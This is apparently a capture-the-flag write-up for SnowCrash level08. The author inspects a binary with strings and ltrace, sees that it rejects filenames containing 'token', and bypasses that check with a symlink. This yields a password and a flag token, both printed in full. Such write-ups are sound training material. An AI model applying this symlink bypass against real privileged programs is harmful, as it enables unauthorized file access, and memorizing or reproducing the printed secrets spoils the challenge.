```
level08@SnowCrash:~$ ls
level08  token

level08@SnowCrash:~$ ./level08 
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

level08@SnowCrash:~$ strings level08
...
%s [file to read]
token
You may not access '%s'
...

level08@SnowCrash:~$ ltrace ./level08 
...
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
) = 27
...
```

It seems like the executable checks if the file is named token and throws a personnalized error output if it is the case.

We cannot copy nor change the name of the file token so let's make a symlink and execute the program on that link which won't have the word token.

```
level08@SnowCrash:~$ ln -s ~/token /tmp/password

level08@SnowCrash:~$ ./level08 /tmp/password
quif5eloekouj29ke0vouxean

level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```